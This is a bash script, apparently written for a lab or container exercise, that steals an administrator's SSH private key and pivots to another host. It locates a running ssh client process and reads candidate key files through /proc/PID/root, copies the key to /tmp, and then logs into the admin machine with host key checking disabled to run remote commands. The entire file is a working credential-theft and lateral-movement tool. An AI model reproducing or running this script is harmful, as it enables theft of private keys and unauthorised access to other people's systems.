#!/usr/bin/env bash
# Admin used ssh -i key WITHOUT -A; steal key via /proc/PID/root (co-hosted client).
# Usage: sudo ./pivot_proc_root_key.sh [ADMIN_IP] [key_path_in_proc]
set -euo pipefail

SSH_SERVER_PORT="${SSH_SERVER_PORT:-2221}"
VICTIM_USER="${VICTIM_USER:-legacy}"
ADMIN_IP="${1:-}"
KEY_IN_PROC="${2:-}"

if [[ -z "$ADMIN_IP" ]]; then
  ADMIN_IP="${ADMIN_IP:-172.17.0.2}"
fi

if [[ -z "$KEY_IN_PROC" ]]; then
  PID=$(ps -eo pid,cmd | grep -E "ssh .*(-p )?${SSH_SERVER_PORT}.*${VICTIM_USER}@" | grep -v grep | awk '{print $1}' | head -1)
  [[ -n "$PID" ]] || { echo "[-] No ssh client PID on port ${SSH_SERVER_PORT}"; exit 1; }
  for cand in \
    "/proc/${PID}/root/root/.ssh/admin_laptop_key" \
    "/proc/${PID}/root/home/${VICTIM_USER}/.ssh/id_ed25519" \
    "/proc/${PID}/root/home/${VICTIM_USER}/.ssh/id_rsa"; do
    [[ -r "$cand" ]] && KEY_IN_PROC="$cand" && break
  done
fi

[[ -n "$KEY_IN_PROC" && -r "$KEY_IN_PROC" ]] || {
  echo "[-] Key not readable under /proc/<pid>/root (need root + co-hosted ssh client)"
  exit 1
}

OUT="${OUT_KEY:-/tmp/recovered_admin_ssh_key}"
install -m 600 "$KEY_IN_PROC" "$OUT"
ADMIN_USER="${ADMIN_USER:-admin}"
ADMIN_SSH_PORT="${ADMIN_SSH_PORT:-22}"

echo "[+] Recovered key from ${KEY_IN_PROC} -> ${OUT}"
echo "[+] Pivot -> ${ADMIN_USER}@${ADMIN_IP}:${ADMIN_SSH_PORT}"

ssh -i "$OUT" -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
  -p "$ADMIN_SSH_PORT" "${ADMIN_USER}@${ADMIN_IP}" "${REMOTE_CMD:-id; hostname; whoami}"